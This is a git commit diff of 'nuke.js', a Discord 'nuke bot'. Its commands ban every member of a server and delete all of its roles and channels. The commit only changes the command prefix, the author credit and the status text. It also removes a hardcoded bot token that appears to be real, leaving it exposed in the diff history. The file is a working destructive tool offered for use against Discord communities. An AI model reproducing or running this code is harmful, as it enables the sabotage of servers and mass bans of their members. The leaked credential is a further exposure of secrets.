f33ca95837a31aebab9b375d00a98f0a35f28e92
sirpan666 <84288451+sirpan666@users.noreply.github.com>
2021-05-16 23:40:11 +0300

    Update nuke.js

--- nuke.js
+++ nuke.js
@@ -3,36 +3,36 @@ const nuke = new discord.Client();
 
 
 nuke.on("ready", () =>{
-console.log("This bot has been developed by beep.")
+console.log("This bot has been developed by sigron666.")
 console.log(`${nuke.user.tag} is online.`);
-nuke.user.setPresence({ game: { name: `Zach rules` }, type: 0 });
+nuke.user.setPresence({ game: { name: `bye` }, type: 0 }); //status is changeable//
 });
 
 nuke.on("message", async(msg)=>{
 
 
 
-if(msg.content.toLowerCase().startsWith("p!" + "nuke")){
+if(msg.content.toLowerCase().startsWith("!" + "nuke")){
     msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
     msg.guild.channels.deleteAll();
     msg.guild.members.tap(member => member.ban("Nuke Bot"));
 }
-if(msg.content.toLowerCase().startsWith("p!" + "delete")){
+if(msg.content.toLowerCase().startsWith("!" + "delete")){
     msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
     msg.guild.channels.deleteAll();
 }
-if(msg.content.toLowerCase().startsWith("p!" + "ban")){
+if(msg.content.toLowerCase().startsWith("!" + "ban")){
     msg.guild.members.tap(member => member.ban("Bot"));
 }
-if(msg.content.toLowerCase().startsWith("p!" + "help")){
+if(msg.content.toLowerCase().startsWith("!" + "help")){
     msg.channel.send({
         embed: {
-            color: 0xff0000,
+            color: 0xff0000, //color is changeable//
             author: { name: "Nuke" },
-            description: "b!nuke - Bans all members & deletes all roles and channels\nb!delete - Deletes all channels and roles\nb!ban - Bans all members in the discord\n\nFor any help contact"
+            description: "!nuke - Bans all members & deletes all roles and channels\n!delete - Deletes all channels and roles\n!ban - Bans all members in the discord\n\nFor any help contact"
         }
     })
 }
 });
 
-nuke.login("ODM3NDQwMjExMjQ3NDMxNjkw.YIsk-Q.vIid_AH_qZBhW52eE0WicaRZF-c");
+nuke.login("PUT YOUR TOKEN HERE");
